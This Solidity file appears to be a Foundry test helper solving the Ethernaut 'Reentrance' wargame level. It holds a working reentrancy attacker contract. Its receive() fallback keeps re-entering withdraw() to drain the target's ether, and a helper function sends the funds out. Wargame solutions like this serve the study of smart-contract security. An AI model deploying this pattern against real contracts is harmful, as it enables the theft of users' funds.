// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

import {console, Test} from "@forge-std/Test.sol";

import "@openzeppelin-0_6_x/contracts/utils/Address.sol";
import '@openzeppelin-0_6_x/contracts/math/SafeMath.sol';


interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
    function balanceOf(address _who) external view returns (uint balance);

}

contract ReentranceAttacker {
    
    IReentrance reentrance;

     uint counter ;
    
    constructor(address _reentrance) public {
        reentrance = IReentrance(_reentrance);
    }
    
    function attack() public payable {
        require(msg.value == 0.2 ether);
        reentrance.donate{value : 0.2 ether}(address(this));
        reentrance.withdraw(0.2 ether);
        // console.log('attack withdraw');

    }

    receive() external payable {

        if( (address(reentrance).balance >= 0.1 ether) && (reentrance.balanceOf(address(this)) >= 0.2 ether) ) {
            reentrance.withdraw(0.1 ether);
            // console.log('payable withdraw');
            // counter++;
            // console.log(counter);
        } else {

        }

        // if(address(reentrance).balance >= 0 ) {
        //     reentrance.withdraw(0.1 ether);
        //     console.log('payable withdraw');
        //     counter++;
        //     console.log(counter);
        // }

    }

    function withdrawETH(address payable to, uint256 amountOut) external  {
        Address.sendValue(to, amountOut);
    }


}